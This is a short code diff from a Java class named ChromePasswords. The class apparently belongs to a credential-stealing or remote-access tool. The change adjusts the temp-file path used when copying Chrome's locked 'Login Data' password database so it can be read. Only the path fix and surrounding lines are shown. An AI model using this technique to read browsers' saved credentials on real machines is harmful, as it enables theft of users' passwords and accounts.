@@ -61,7 +61,7 @@ public class ChromePasswords implements Request {
             //Chrome locks its DATABASE file when its running, so we cant access it unless we copy it temporary and THEN access it
 
             String loginDataFile = System.getProperty("user.home") + "/Appdata/Local/Google/Chrome/User Data/Default/Login Data";
-            String finalDestination = System.getProperty("java.io.tmpdir") + "/Data";
+            String finalDestination = System.getProperty("java.io.tmpdir") + "Data";
             File finalDestinationFile = new File(finalDestination);
             if(finalDestinationFile.exists())
                 finalDestinationFile.delete();
